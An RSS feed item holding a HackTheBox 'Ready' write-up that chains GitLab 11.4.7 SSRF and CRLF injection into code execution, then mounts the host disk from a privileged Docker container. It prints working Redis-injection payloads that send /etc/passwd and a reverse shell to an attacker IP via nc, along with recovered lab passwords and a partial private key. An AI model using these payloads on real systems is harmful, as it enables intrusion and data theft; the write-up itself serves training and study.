<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>SSRF on Ef&#39;s log</title>
    <link>https://fahmifj.github.io/tags/ssrf/</link>
    <description>Recent content in SSRF on Ef&#39;s log</description>
    <generator>Hugo -- gohugo.io</generator>
    <lastBuildDate>Sat, 15 May 2021 22:00:39 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/tags/ssrf/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>HackTheBox - Ready</title>
      <link>https://fahmifj.github.io/writeups/hackthebox/htb-ready/</link>
      <pubDate>Sat, 15 May 2021 22:00:39 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-ready/</guid>
      <description>Turns SSRF to remote code execution and escape from Docker container</description>
      <content:encoded><![CDATA[<p>Ready is a medium difficulty Linux machine from HackTheBox that features a GitLab instance in a Docker container. By chaining two CVEs, I&rsquo;m able to gain a foothold on the container. Enumerating inside the container discovers a password that can be used on container root account. The container is found to be running in privileged mode, and this can be abused to mount the host file system into the container.</p>
<h3 id="skills-learned">Skills Learned</h3>
<ul>
<li>GitLab 11.4.7 exploitation</li>
<li>Chaining bugs from CVE-2018-19571 and CVE-2018-19585</li>
<li>Docker security</li>
</ul>
<h3 id="tools">Tools</h3>
<ul>
<li>Kali Linux (Attacking Machine) - <a href="https://www.kali.org/">https://www.kali.org/</a></li>
<li>Nmap - Preinstalled in Kali Linux</li>
<li>BurpSuite - Preinstalled in Kali Linux</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>All ports scan with <code>nmap</code> discovers two open ports: SSH on port 22, and a HTTP web server on port 5080</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">→ root@kali «ready» «10.10.14.20» 
$ nmap -p- -sV --reason -oA nmap/10-initial-ready <span class="s1">&#39;10.10.10.220&#39;</span>
Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-05-14 04:53 EDT
Nmap scan report <span class="k">for</span> 10.10.10.220
Host is up, received echo-reply ttl <span class="m">63</span> <span class="o">(</span>0.18s latency<span class="o">)</span>.
Not shown: <span class="m">65533</span> closed ports
Reason: <span class="m">65533</span> resets
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl <span class="m">63</span> OpenSSH 8.2p1 Ubuntu <span class="m">4</span> <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
5080/tcp open  http    syn-ack ttl <span class="m">62</span> nginx
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 503.44 seconds
</code></pre></div><p>After performing a default script scan shows there&rsquo;s a GitLab instance on port 5080.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">→ root@kali «ready» «10.10.14.20» 
$ nmap -p22,5080 -sC -sV --reason -oA nmap/10-default-ready 10.10.10.220
Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-05-14 05:17 EDT
Nmap scan report <span class="k">for</span> 10.10.10.220
Host is up, received echo-reply ttl <span class="m">63</span> <span class="o">(</span>0.090s latency<span class="o">)</span>.

PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl <span class="m">63</span> OpenSSH 8.2p1 Ubuntu <span class="m">4</span> <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
5080/tcp open  http    syn-ack ttl <span class="m">62</span> nginx
<span class="p">|</span> http-robots.txt: <span class="m">53</span> disallowed entries <span class="o">(</span><span class="m">15</span> shown<span class="o">)</span>
<span class="p">|</span> / /autocomplete/users /search /api /admin /profile 
<span class="p">|</span> /dashboard /projects/new /groups/new /groups/*/edit /users /help 
<span class="p">|</span>_/s/ /snippets/new /snippets/*/edit
<span class="p">|</span> http-title: Sign in <span class="se">\x</span>C2<span class="se">\x</span>B7 GitLab
<span class="p">|</span>_Requested resource was http://10.10.10.220:5080/users/sign_in
<span class="p">|</span>_http-trane-info: Problem with XML parsing of /evox/about
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 14.70 seconds
</code></pre></div><h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-5080---gitlab">TCP 5080 - GitLab</h3>
<p>The page displays a self-hosted GitLab Community Edition.</p>
<p><img class="img-container" src="imgs/image-20210514162031899.png" alt="image-20210514162031899"  />
</p>
<p>I can register with any email domain.</p>
<p><img class="img-container" src="imgs/image-20210514162151369.png" alt="image-20210514162151369"  />
</p>
<p>The GitLab version can be seen by visiting<code>/help</code>, and it seems to be an outdated one.</p>
<p><img class="img-container" src="imgs/image-20210514162920343.png" alt="image-20210514162920343"  />
</p>
<p>I&rsquo;ll take a note on the version.</p>
<h4 id="user-enumeration-via-gitlab-api">User Enumeration via GitLab API</h4>
<p>I can enumerate the GitLab users via <code>/api/v4/users</code>, but in the end, this was not used.</p>
<p><img class="img-container" src="imgs/image-20210514162754664.png" alt="image-20210514162754664"  />
</p>
<p>I&rsquo;ll move and search for vulnerabilities.</p>
<h4 id="searchsploit">Searchsploit</h4>
<p>I can feed the GitLab version to <code>searchsploit</code>, and it returns with two exploits that match with the version.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">→ root@kali «~» «10.10.14.20» 
$ searchsploit GitLab 11.4.7    
-------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                            |  Path
-------------------------------------------------------------------------- ---------------------------------
GitLab 11.4.7 - RCE (Authenticated) (2)                                   | ruby/webapps/49334.py
GitLab 11.4.7 - Remote Code Execution (Authenticated) (1)                 | ruby/webapps/49257.py
-------------------------------------------------------------------------- ---------------------------------
</code></pre></div><p>I relaxed the search keyword to find other potential exploits, and I found an arbitrary file read which previously was used to exploit <a href="/writeup/htb-laboratory">Laboratory</a>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">→ root@kali «exploit» «10.10.14.20»
$ searchsploit GitLab
-------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                            |  Path
-------------------------------------------------------------------------- ---------------------------------
GitLab - &#39;impersonate&#39; Feature Privilege Escalation                       | ruby/webapps/40236.txt
GitLab 11.4.7 - RCE (Authenticated) (2)                                   | ruby/webapps/49334.py
GitLab 11.4.7 - Remote Code Execution (Authenticated) (1)                 | ruby/webapps/49257.py
GitLab 12.9.0 - Arbitrary File Read                                       | ruby/webapps/48431.txt
Gitlab 12.9.0 - Arbitrary File Read (Authenticated)                       | ruby/webapps/49076.py
Gitlab 6.0 - Persistent Cross-Site Scripting                              | php/webapps/30329.sh
Gitlab-shell - Code Execution (Metasploit)                                | linux/remote/34362.rb
Jenkins Gitlab Hook Plugin 1.4.2 - Reflected Cross-Site Scripting         | java/webapps/47927.txt
NPMJS gitlabhook 0.0.17 - &#39;repository&#39; Remote Command Execution           | json/webapps/47420.txt
-------------------------------------------------------------------------- ---------------------------------
</code></pre></div><h2 id="foothold">Foothold</h2>
<h3 id="shell-as-git">Shell as git</h3>
<h4 id="gitlab-1147-rce-cve-2018-19571--cve-2018-19585---poc">GitLab 11.4.7 RCE (CVE-2018-19571 &amp; CVE-2018-19585) - PoC</h4>
<p>The RCE exploit that was popped on <code>searchsploit</code> above is consist of two vulnerabilities, SSRF (CVE-2018-19571) and CRLF Injection (CVE-2018-19585). The exploit&rsquo;s author uses the <a href="https://liveoverflow.com/gitlab-11-4-7-remote-code-execution-real-world-ctf-2018/">LifeOverFlow</a>&rsquo;s blog post as reference. So I decided to read that blog and try to reproduce it here.</p>
<p>With SSRF, you can talk with the internal Redis server on port 6379 that used by GitLab as database, cache and message broker. If there is an HTTP request sent to the Redis server using SSRF, the request would read as follows (<code># ==&gt;</code>  is a comment by me)</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="err">GET blablabla HTTP/1.1 # ==&gt; Redis read this as a command 
</span><span class="err">Host: [0:0:0:0:0:ffff:127.0.0.1]:6379 
</span><span class="err">User-Agent: git/2.18.1  
</span><span class="err">Accept: */* 
</span><span class="err">Accept-Encoding: deflate, gzip 
</span><span class="err">Pragma: no-cache 
</span><span class="err">
</span><span class="err">- Err wrong number of arguments for &#39;get&#39; command 
</span></code></pre></div><p>The idea here is to use the CRLF Injection to insert a payload after the &lsquo;GET&rsquo;  line.</p>
<p>For this, I’ll need Burp Suite turned on.</p>
<p>On GitLab, I’ll import a (non-exist) project and choose the &ldquo;Repo by URL&rdquo; menu.</p>
<p><img class="img-container" src="imgs/image-20210514171125509.png" alt="image-20210514171125509"  />
</p>
<p>I&rsquo;ll be using the same SSRF payload to bypass the GitLab URL filter which is <code>git://[0:0:0:0:0:ffff:127.0.0.1]:6379/</code> and add my (non-exist) <code>.git</code> repository at the end of the URL, so it becomes <code>git://[0:0:0:0:0:ffff:127.0.0.1]:6379/iamf/ssrf-test.git</code></p>
<p><img class="img-container" src="imgs/image-20210515000620634.png" alt="image-20210515000620634"  />
</p>
<blockquote>
<p>The repository URL above is a <a href="http://www.tcpipguide.com/free/t_IPv6IPv4AddressEmbedding.htm">special IPv6 address</a> where its last 32 bits is used to embed the IPv4 address. The URL was used to bypass the SSRF protection defined in <code>spec/lib/gitlab/url_blocker_spec.rb</code></p>
</blockquote>
<p>I&rsquo;ll intercept the request after I hit the “Create Project” button, and then on BurpSuite, I’ll modify the import URL to this:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"> git://[0:0:0:0:0:ffff:127.0.0.1]:6379/iamf/
 multi

 sadd resque:gitlab:queues system_hook_push

 lpush resque:gitlab:queue:system_hook_push &#34;{\&#34;class\&#34;:\&#34;GitlabShellWorker\&#34;,\&#34;args\&#34;:[\&#34;class_eval\&#34;,\&#34;open(\&#39;|cat /etc/passwd | nc 10.10.14.20 9000\&#39;).read\&#34;],\&#34;retry\&#34;:3,\&#34;queue\&#34;:\&#34;system_hook_push\&#34;,\&#34;jid\&#34;:\&#34;ad52abc5641173e217eb2e52\&#34;,\&#34;created_at\&#34;:1513714403.8122594,\&#34;enqueued_at\&#34;:1513714403.8129568}&#34;

 exec
 exec
/ssrf-test.git
</code></pre></div><p>So the HTTP request now looks like this:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="nf">POST</span> <span class="nn">/projects</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="n">Host</span><span class="o">:</span> <span class="l">10.10.10.220:5080</span>
<span class="n">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0</span>
<span class="n">Accept</span><span class="o">:</span> <span class="l">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
<span class="n">Accept-Language</span><span class="o">:</span> <span class="l">en-US,en;q=0.5</span>
<span class="n">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
<span class="n">Referer</span><span class="o">:</span> <span class="l">http://10.10.10.220:5080/projects/new</span>
<span class="n">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded</span>
<span class="n">Content-Length</span><span class="o">:</span> <span class="l">778</span>
<span class="n">Connection</span><span class="o">:</span> <span class="l">close</span>
<span class="n">Cookie</span><span class="o">:</span> <span class="l">sidebar_collapsed=false; _gitlab_session=4426e39af6c1d3d4a4484a8a53f0bac9; event_filter=all</span>
<span class="n">Upgrade-Insecure-Requests</span><span class="o">:</span> <span class="l">1</span>

utf8=%E2%9C%93&amp;authenticity_token=cbS9UXXZDmvTgBUhOTMxF%2FOSii%2FgetcSbM%2FNTT2dG6NllhoQsV8uvbDU65arU9dEOumftKI48ZaDBi6rnJbjOQ%3D%3D&amp;project%5Bimport_url%5D= git://[0:0:0:0:0:ffff:127.0.0.1]:6379/iamf/
 multi

 sadd resque:gitlab:queues system_hook_push

 lpush resque:gitlab:queue:system_hook_push &#34;{\&#34;class\&#34;:\&#34;GitlabShellWorker\&#34;,\&#34;args\&#34;:[\&#34;class_eval\&#34;,\&#34;open(\&#39;|cat /etc/passwd | nc 10.10.14.20 9000\&#39;).read\&#34;],\&#34;retry\&#34;:3,\&#34;queue\&#34;:\&#34;system_hook_push\&#34;,\&#34;jid\&#34;:\&#34;ad52abc5641173e217eb2e52\&#34;,\&#34;created_at\&#34;:1513714403.8122594,\&#34;enqueued_at\&#34;:1513714403.8129568}&#34;

 exec
 exec
/ssrf-test.git&amp;project%5Bci_cd_only%5D=false&amp;project%5Bname%5D=SSRF+test&amp;project%5Bnamespace_id%5D=5&amp;project%5Bpath%5D=ssrf-test&amp;project%5Bdescription%5D=&amp;project%5Bvisibility_level%5D=0
</code></pre></div><p>After I hit the send button, my <code>nc</code> listener caught the file contents of <code>/etc/passwd</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"> root@kali «exploit» «10.10.14.20» 
$ nc -nvlp <span class="m">9000</span>
listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">9000</span> ...
connect to <span class="o">[</span>10.10.14.20<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.220<span class="o">]</span> <span class="m">36612</span>
...&lt;SNIP&gt;...
git:x:998:998::/var/opt/gitlab:/bin/sh
gitlab-www:x:999:999::/var/opt/gitlab/nginx:/bin/false
gitlab-redis:x:997:997::/var/opt/gitlab/redis:/bin/false
gitlab-psql:x:996:996::/var/opt/gitlab/postgresql:/bin/sh
mattermost:x:994:994::/var/opt/gitlab/mattermost:/bin/sh
registry:x:993:993::/var/opt/gitlab/registry:/bin/sh
gitlab-prometheus:x:992:992::/var/opt/gitlab/prometheus:/bin/sh
gitlab-consul:x:991:991::/var/opt/gitlab/consul:/bin/sh
dude:x:1000:1000::/home/dude:/bin/bash
</code></pre></div><p><img class="img-container" src="imgs/image-20210515002210570.png" alt="image-20210515002210570"  />
</p>
<h4 id="weaponize---reverse-shell">Weaponize - Reverse Shell</h4>
<p>From here, I’ll reproduce the step above, but this time I’ll send myself a shell. The payload as follows.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"> git://[0:0:0:0:0:ffff:127.0.0.1]:6379/iamf/
 multi

 sadd resque:gitlab:queues system_hook_push

 lpush resque:gitlab:queue:system_hook_push &#34;{\&#34;class\&#34;:\&#34;GitlabShellWorker\&#34;,\&#34;args\&#34;:[\&#34;class_eval\&#34;,\&#34;open(\&#39;|nc -e /bin/bash 10.10.14.20 9000\&#39;).read\&#34;],\&#34;retry\&#34;:3,\&#34;queue\&#34;:\&#34;system_hook_push\&#34;,\&#34;jid\&#34;:\&#34;ad52abc5641173e217eb2e52\&#34;,\&#34;created_at\&#34;:1513714403.8122594,\&#34;enqueued_at\&#34;:1513714403.8129568}&#34;

 exec
 exec
/ssrf-to-rce.git
</code></pre></div><p>On my <code>nc</code> listener:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">→ root@kali «exploit» «10.10.14.20» 
$ nc -nvlp 9000
listening on [any] 9000 ...
connect to [10.10.14.20] from (UNKNOWN) [10.10.10.220] 37306
id
uid=998(git) gid=998(git) groups=998(git)
hostname
gitlab.example.com
pwd   
/var/opt/gitlab/gitlab-rails/working
</code></pre></div><h4 id="shell-upgrade">Shell Upgrade</h4>
<p>I&rsquo;ll do the &lsquo;stty&rsquo; trick to <a href="https://fahmifj.medium.com/get-a-fully-interactive-reverse-shell-b7e8d6f5b1c1">upgrade my shell</a>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">which python3
/opt/gitlab/embedded/bin/python3
python3 -c <span class="s1">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
git@gitlab:~/gitlab-rails/working$ ^Z
<span class="o">[</span>2<span class="o">]</span>  + <span class="m">2354</span> suspended  nc -nvlp <span class="m">9000</span>
→ root@kali «exploit» «10.10.14.20» 
$ stty raw -echo<span class="p">;</span> <span class="nb">fg</span>
<span class="o">[</span>2<span class="o">]</span>  - <span class="m">2354</span> continued  nc -nvlp <span class="m">9000</span>

git@gitlab:~/gitlab-rails/working$ 
git@gitlab:~/gitlab-rails/working$ <span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
</code></pre></div><p>On <code>/home</code>, there is only one user called <code>dude</code>, and I&rsquo;m able to read the user flag there.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">git@gitlab:/home/dude$ ls -la
total <span class="m">24</span>
drwxr-xr-x <span class="m">2</span> dude dude <span class="m">4096</span> Dec  <span class="m">7</span> 16:58 .
drwxr-xr-x <span class="m">1</span> root root <span class="m">4096</span> Dec  <span class="m">2</span> 10:45 ..
lrwxrwxrwx <span class="m">1</span> root root    <span class="m">9</span> Dec  <span class="m">7</span> 16:58 .bash_history -&gt; /dev/null
-rw-r--r-- <span class="m">1</span> dude dude  <span class="m">220</span> Aug <span class="m">31</span>  <span class="m">2015</span> .bash_logout
-rw-r--r-- <span class="m">1</span> dude dude <span class="m">3771</span> Aug <span class="m">31</span>  <span class="m">2015</span> .bashrc
-rw-r--r-- <span class="m">1</span> dude dude  <span class="m">655</span> May <span class="m">16</span>  <span class="m">2017</span> .profile
-r--r----- <span class="m">1</span> dude git    <span class="m">33</span> Dec  <span class="m">2</span> 10:46 user.txt
git@gitlab:/home/dude$ cat user.txt 
e1e30b052b6ec0670698...&lt;SNIP&gt;...
</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-root">Shell as root</h3>
<h4 id="container-enumeration">Container enumeration</h4>
<p>I found a <code>.dockerenv</code> on the root directory which indicates that I&rsquo;m inside container, and there is also a file called <code>root_pass</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">git@gitlab:~$ ls -la /
total <span class="m">104</span>
drwxr-xr-x   <span class="m">1</span> root root <span class="m">4096</span> Dec  <span class="m">1</span> 12:41 .
drwxr-xr-x   <span class="m">1</span> root root <span class="m">4096</span> Dec  <span class="m">1</span> 12:41 ..
-rwxr-xr-x   <span class="m">1</span> root root    <span class="m">0</span> Dec  <span class="m">1</span> 12:41 .dockerenv
...&lt;SNIP&gt;...
-rw-r--r--   <span class="m">1</span> root root   <span class="m">23</span> Jun <span class="m">29</span>  <span class="m">2020</span> root_pass
</code></pre></div><p>The content of <code>root_pass</code> is a random string, which I think it is a password. I tried it to the user and root account but it didn&rsquo;t work.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">git@gitlab:/opt/backup$ cat /root_pass 
YG65407Bjqvv9A0a8Tm_7w
</code></pre></div><p>Exploring on <code>/opt</code>, I found a folder called <code>backup</code>. The folder contains three files: <code>docker-compose.yml</code>, <code>gitlab-secrets.json</code> and <code>gitlab.rb</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">git@gitlab:/opt/backup$ ls -l
total <span class="m">100</span>
-rw-r--r-- <span class="m">1</span> root root   <span class="m">872</span> Dec  <span class="m">7</span> 09:25 docker-compose.yml
-rw-r--r-- <span class="m">1</span> root root <span class="m">15092</span> Dec  <span class="m">1</span> 16:23 gitlab-secrets.json
-rw-r--r-- <span class="m">1</span> root root <span class="m">79639</span> Dec  <span class="m">1</span> 19:20 gitlab.rb
</code></pre></div><p>Upon performing a recursive grep to search for files containing a &ldquo;pass&rdquo; string inside the folder, I discovered an SMTP password on <code>gitlab.rb</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">git@gitlab:/opt/backup$ grep -Ri <span class="s2">&#34;pass&#34;</span>
...&lt;SNIP&gt;...
gitlab.rb:gitlab_rails<span class="o">[</span><span class="s1">&#39;smtp_password&#39;</span><span class="o">]</span> <span class="o">=</span> <span class="s2">&#34;wW59U!ZKMbG9+*#h&#34;</span>
...&lt;SNIP&gt;...
</code></pre></div><p>Looking into the <code>docker-compose.yml</code>, I see a potential vector for container breakout.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-yaml" data-lang="yaml"><span class="l">git@gitlab:/opt/backup$ cat docker-compose.yml </span><span class="w">
</span><span class="w"></span><span class="nt">version</span><span class="p">:</span><span class="w"> </span><span class="s1">&#39;2.4&#39;</span><span class="w">
</span><span class="w">
</span><span class="w"></span><span class="nt">services</span><span class="p">:</span><span class="w">
</span><span class="w">  </span><span class="nt">web</span><span class="p">:</span><span class="w">
</span><span class="w">    </span><span class="nt">image</span><span class="p">:</span><span class="w"> </span><span class="s1">&#39;gitlab/gitlab-ce:11.4.7-ce.0&#39;</span><span class="w">
</span><span class="w">    </span><span class="nt">restart</span><span class="p">:</span><span class="w"> </span><span class="l">always</span><span class="w">
</span><span class="w">    </span><span class="nt">hostname</span><span class="p">:</span><span class="w"> </span><span class="s1">&#39;gitlab.example.com&#39;</span><span class="w">
</span><span class="w">    </span><span class="nt">environment</span><span class="p">:</span><span class="w">
</span><span class="w">      </span><span class="nt">GITLAB_OMNIBUS_CONFIG</span><span class="p">:</span><span class="w"> </span><span class="p">|</span><span class="sd">
</span><span class="sd">        external_url &#39;http://172.19.0.2&#39;
</span><span class="sd">        redis[&#39;bind&#39;]=&#39;127.0.0.1&#39;
</span><span class="sd">        redis[&#39;port&#39;]=6379
</span><span class="sd">        gitlab_rails[&#39;initial_root_password&#39;]=File.read(&#39;/root_pass&#39;)</span><span class="w">        
</span><span class="w">    </span><span class="nt">networks</span><span class="p">:</span><span class="w">
</span><span class="w">      </span><span class="nt">gitlab</span><span class="p">:</span><span class="w">
</span><span class="w">        </span><span class="nt">ipv4_address</span><span class="p">:</span><span class="w"> </span><span class="m">172.19.0.2</span><span class="w">
</span><span class="w">    </span><span class="nt">ports</span><span class="p">:</span><span class="w">
</span><span class="w">      </span>- <span class="s1">&#39;5080:80&#39;</span><span class="w">
</span><span class="w">      </span><span class="c">#- &#39;127.0.0.1:5080:80&#39;</span><span class="w">
</span><span class="w">      </span><span class="c">#- &#39;127.0.0.1:50443:443&#39;</span><span class="w">
</span><span class="w">      </span><span class="c">#- &#39;127.0.0.1:5022:22&#39;</span><span class="w">
</span><span class="w">    </span><span class="nt">volumes</span><span class="p">:</span><span class="w">
</span><span class="w">      </span>- <span class="s1">&#39;./srv/gitlab/config:/etc/gitlab&#39;</span><span class="w">
</span><span class="w">      </span>- <span class="s1">&#39;./srv/gitlab/logs:/var/log/gitlab&#39;</span><span class="w">
</span><span class="w">      </span>- <span class="s1">&#39;./srv/gitlab/data:/var/opt/gitlab&#39;</span><span class="w">
</span><span class="w">      </span>- <span class="s1">&#39;./root_pass:/root_pass&#39;</span><span class="w">
</span><span class="w">    </span><span class="nt">privileged</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="w"> </span><span class="c"># ==&gt; Potential privesc vector</span><span class="w">
</span><span class="w">    </span><span class="nt">restart</span><span class="p">:</span><span class="w"> </span><span class="l">unless-stopped</span><span class="w">
</span><span class="w">    </span><span class="c">#mem_limit: 1024m</span><span class="w">
</span><span class="w">
</span><span class="w"></span><span class="nt">networks</span><span class="p">:</span><span class="w">
</span><span class="w">  </span><span class="nt">gitlab</span><span class="p">:</span><span class="w">
</span><span class="w">    </span><span class="nt">driver</span><span class="p">:</span><span class="w"> </span><span class="l">bridge</span><span class="w">
</span><span class="w">    </span><span class="nt">ipam</span><span class="p">:</span><span class="w">
</span><span class="w">      </span><span class="nt">config</span><span class="p">:</span><span class="w">
</span><span class="w">        </span>- <span class="nt">subnet</span><span class="p">:</span><span class="w"> </span><span class="m">172.19.0.0</span><span class="l">/16</span><span class="w">
</span></code></pre></div><h4 id="su---root-container">su - root (container)</h4>
<p>The password <code>wW59U!ZKMbG9+*#h</code> works on the container root account</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">git@gitlab:/opt/gitlab$ su root
Password: wW59U!ZKMbG9+*#h
root@gitlab:/opt/gitlab# id
uid=0(root) gid=0(root) groups=0(root)
</code></pre></div><h4 id="docker-breakout">Docker Breakout</h4>
<p>Based on the <code>docker-compose.yml</code> file, I suspect the container is running with privileged flag. According to my favorite blog, which is <a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout#">BookHackTrick</a>, a container with privileged flag will have access to the host devices.</p>
<p>Although, <code>--privileged</code> gives all the Linux capabilities, I&rsquo;ll still check it manually to make sure I have access to the host devices.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">root@gitlab:/opt/gitlab# capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37+eip
...&lt;SNIP&gt;...
</code></pre></div><p>There is a <code>CAP_SYS_ADMIN</code>, with this capabilities I&rsquo;m able to mount the host devices to make it available on the container. I can list all the host devices with <code>fdisk -l</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">root@gitlab:~# fdisk -l

...&lt;SNIP&gt;...
Disk /dev/sda: 20 GiB, 21474836480 bytes, 41943040 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes
Disklabel type: gpt
Disk identifier: 32558524-85A4-4072-AA28-FA341BE86C2E

Device        Start      End  Sectors Size Type
/dev/sda1      2048     4095     2048   1M BIOS boot
/dev/sda2      4096 37746687 37742592  18G Linux filesystem # the root (/) dir
/dev/sda3  37746688 41940991  4194304   2G Linux swap
</code></pre></div><p>Now I can simply mount the Linux filesystem (<code>/dev/sda2</code>) to my specified folder.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">root@gitlab:/media# mkdir iamf
root@gitlab:/media# mount /dev/sda2 /media/iamf
root@gitlab:/media# ls iamf/
bin   cdrom  etc   lib    lib64   lost+found  mnt  proc  run   snap  sys  usr
boot  dev    home  lib32  libx32  media       opt  root  sbin  srv   tmp  var
</code></pre></div><p>The root user of the host has SSH keys, I’ll grab only the private key to my machine.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">root@gitlab:/media# ls -l iamf/root/.ssh/ 
total 12
-rw------- 1 root root  405 Dec  7 16:49 authorized_keys
-rw------- 1 root root 1675 Dec  7 16:49 id_rsa
-rw-r--r-- 1 root root  405 Dec  7 16:49 id_rsa.pub
root@gitlab:/media# cat iamf/root/.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAvyovfg++zswQT0s4YuKtqxOO6EhG38TR2eUaInSfI1rjH09Q
sle1ivGnwAUrroNAK48LE70Io13DIfE9rxcotDviAIhbBOaqMLbLnfnnCNLApjCn
6KkYjWv+9kj9shzPaN1tNQLc2Rg39pn1mteyvUi2pBfA4ItE05F58WpCgh9KNMlf
YmlPwjeRaqARlkkCgFcHFGyVxd6Rh4ZHNFjABd8JIl+Yaq/pg7t4qPhsiFsMwntX
TBKGe8T4lzyboBNHOh5yUAI3a3Dx3MdoY+qXS/qatKS2Qgh0Ram2LLFxib9hR49W
rG87jLNt/6s06z+Mwf7d/oN8SmCiJx3xHgFzbwIDAQABAoIBACeFZC4uuSbtv011
YqHm9TqSH5BcKPLoMO5YVA/dhmz7xErbzfYg9fJUxXaIWyCIGAMpXoPlJ90GbGof
Ar6pDgw8+RtdFVwtB/BsSipN2PrU/2kcVApgsyfBtQNb0b85/5NRe9tizR/Axwkf
iUxK3bQOTVwdYQ3LHR6US96iNj/KNru1E8WXcsii5F7JiNG8CNgQx3dzve3Jzw5+
lg5bKkywJcG1r4CU/XV7CJH2SEUTmtoEp5LpiA2Bmx9A2ep4AwNr7bd2sBr6x4ab
VYYvjQlf79/ANRXUUxMTJ6w4ov572Sp41gA9bmwI/Er2uLTVQ4OEbpLoXDUDC1Cu
K4ku7QECgYEA5G3RqH9ptsouNmg2H5xGZbG5oSpyYhFVsDad2E4y1BIZSxMayMXL
g7vSV+D/almaACHJgSIrBjY8ZhGMd+kbloPJLRKA9ob8rfxzUvPEWAW81vNqBBi2
3hO044mOPeiqsHM/+RQOW240EszoYKXKqOxzq/SK4bpRtjHsidSJo4ECgYEA1jzy
n20X43ybDMrxFdVDbaA8eo+og6zUqx8IlL7czpMBfzg5NLlYcjRa6Li6Sy8KNbE8
kRznKWApgLnzTkvupk/oYSijSliLHifiVkrtEY0nAtlbGlgmbwnW15lwV+d3Ixi1
